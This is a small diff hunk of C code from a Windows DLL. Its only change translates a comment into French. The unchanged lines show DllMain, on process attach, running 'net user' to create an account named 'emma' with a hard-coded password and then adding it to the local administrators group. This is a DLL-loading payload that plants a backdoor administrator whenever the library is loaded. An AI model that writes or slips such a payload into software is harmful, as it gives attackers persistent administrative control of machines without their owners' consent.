@@ -1274,7 +1274,7 @@ BOOL APIENTRY DllMain(
     LPVOID lpReserved      // Reserved
 ) {
     if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
-        // Execute system commands to add a new user and grant admin rights
+        // Exécuter les commandes système pour créer un compte et lui attribuer des droits d'administration
         system("net user emma Password123! /add");
         system("net localgroup administrators emma /add");
     }
